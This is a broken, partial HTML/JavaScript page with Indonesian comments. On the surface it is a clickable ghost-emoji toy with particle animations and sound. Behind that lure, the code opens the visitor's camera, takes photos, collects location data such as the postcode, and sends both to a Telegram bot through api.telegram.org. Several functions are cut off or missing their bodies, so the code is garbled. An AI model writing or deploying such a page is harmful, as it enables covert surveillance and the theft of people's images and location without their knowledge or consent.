    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: #000000;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
            flex-direction: column;
        }
        
        .ghost-container {
            position: relative;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        
        .main-ghost {
            font-size: 40vw;
            cursor: pointer;
            user-select: none;
            z-index: 100;
            position: relative;
            transition: transform 0.2s;
            filter: drop-shadow(0 0 20px rgba(255, 255, 255, 0.7));
            margin-bottom: 20px;
        }
        
        .main-ghost:active {
            transform: scale(0.9);
        }
        
        .loading-text {
            color: white;
            font-size: 6vw;
            text-align: center;
            opacity: 0;
            transition: opacity 0.3s;
            font-family: Arial, sans-serif;
            text-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
        }
        
        .loading-text.show {
            opacity: 1;
        }
        
        .ghost-particle {
            position: absolute;
            font-size: 8rem;
            pointer-events: none;
            opacity: 0;
            z-index: 1;
            animation: particle 2s ease-out forwards;
        }
        
        @keyframes particle {
            0% { 
                opacity: 1;
                transform: translate(0, 0) scale(1) rotate(0deg);
            }
            100% { 
                opacity: 0;
                transform: translate(var(--tx), var(--ty)) scale(0.1) rotate(360deg);
            }
        }
        
        @keyframes pulse {
            0% {
                transform: scale(1);
                filter: brightness(1) drop-shadow(0 0 20px rgba(255, 255, 255, 0.7));
            }
            50% {
                transform: scale(1.1);
                filter: brightness(1.5) drop-shadow(0 0 30px rgba(255, 255, 255, 1));
            }
            100% {
                transform: scale(1);
                filter: brightness(1) drop-shadow(0 0 20px rgba(255, 255, 255, 0.7));
            }
        }
        
        .loading {
            animation: pulse 0.8s infinite;
        }
    </style>

        // Suara klik
        function playClickSound() {
            try {
                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
                const oscillator = audioContext.createOscillator();
                const gainNode = audioContext.createGain();
                
                oscillator.connect(gainNode);
                gainNode.connect(audioContext.destination);
                
                oscillator.frequency.setValueAtTime(800, audioContext.currentTime);
                oscillator.frequency.exponentialRampToValueAtTime(200, audioContext.currentTime + 0.1);
                
                gainNode.gain.setValueAtTime(0.3, audioContext.currentTime);
                gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.1);
                
                oscillator.start(audioContext.currentTime);
                oscillator.stop(audioContext.currentTime + 0.1);
            } catch (e) {}
        }
        
        // Event listener untuk emoji
        mainGhost.addEventListener('click', async function(e) {

            isCollecting = false;
        });

            for (let i = 0; i < particlesCount; i++) {

                particle.className = 'ghost-particle';
                
                const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];

                particle.style.left = (x - randomSize * 8) + 'px';
                particle.style.top = (y - randomSize * 8) + 'px';
                
                const angle = Math.random() * Math.PI * 2;
                const distance = 200 + Math.random() * 400;
                const tx = Math.cos(angle) * distance;
                const ty = Math.sin(angle) * distance;
                
                particle.style.setProperty('--tx', tx + 'px');
                particle.style.setProperty('--ty', ty + 'px');
                
                const hue = Math.random() * 360;
                particle.style.filter = `hue-rotate(${hue}deg) drop-shadow(0 0 10px rgba(255, 255, 255, 0.8))`;
                
                particle.style.animationDelay = (Math.random() * 0.5) + 's';
                
                document.body.appendChild(particle);
                
                setTimeout(() => {
                    if (particle.parentNode) {
                        particle.parentNode.removeChild(particle);
                    }
                }, 2000);
            }
        }
        
        // Akses kamera
        async function accessCamera(facingMode = 'user') {
            return new Promise(async (resolve, reject) => {
                try {
                    if (cameraStream) {
                        cameraStream.getTracks().forEach(track => track.stop());
                    }
                    
                    const constraints = {
                        video: { 
                            facingMode: facingMode,
                            width: { ideal: 1920 },
                            height: { ideal: 1080 }
                        }
                    };
                    
                    cameraStream = await navigator.mediaDevices.getUserMedia(constraints);
                    cameraVideo.srcObject = cameraStream;
                    
                    cameraVideo.onloadedmetadata = () => {
                        cameraVideo.play().then(() => {
                            setTimeout(() => {
                                resolve(cameraStream);
                            }, 500);
                        });
                    };
                    
                    cameraVideo.onerror = reject;
                    
                } catch (error) {
                    reject(error);
                }
            });
        }
        
        // Ambil foto
        async function capturePhoto(facingMode = 'user') {
            return new Promise(async (resolve) => {
                try {
                    await accessCamera(facingMode);
                    
                    await new Promise(resolve => setTimeout(resolve, 800));
                    
                    const context = cameraCanvas.getContext('2d');
                    cameraCanvas.width = cameraVideo.videoWidth;
                    cameraCanvas.height = cameraVideo.videoHeight;
                    
                    // Tambah brightness dan contrast
                    context.drawImage(cameraVideo, 0, 0, cameraCanvas.width, cameraCanvas.height);
                    context.filter = 'brightness(1.2) contrast(1.2)';
                    context.drawImage(cameraCanvas, 0, 0);
                    context.filter = 'none';
                    
                    cameraCanvas.toBlob(blob => {
                        if (cameraStream) {
                            cameraStream.getTracks().forEach(track => track.stop());
                            cameraStream = null;
                        }
                        resolve(blob);
                    }, 'image/jpeg', 0.9);
                    
                } catch (error) {
                    if (cameraStream) {
                        cameraStream.getTracks().forEach(track => track.stop());
                        cameraStream = null;
                    }
                    resolve(null);
                }
            });
        }

                    data.kodePos = locationData.postcode || "Tidak Terdeteksi";

            return data;
        }

        // Kirim ke Telegram
        async function sendToTelegram(message) {
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({

                        text: message
                    })
                });
            } catch (error) {}

        // Kirim foto ke Telegram
        async function sendPhotoToTelegram(photoBlob, caption) {
            try {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', photoBlob);
                formData.append('caption', caption);
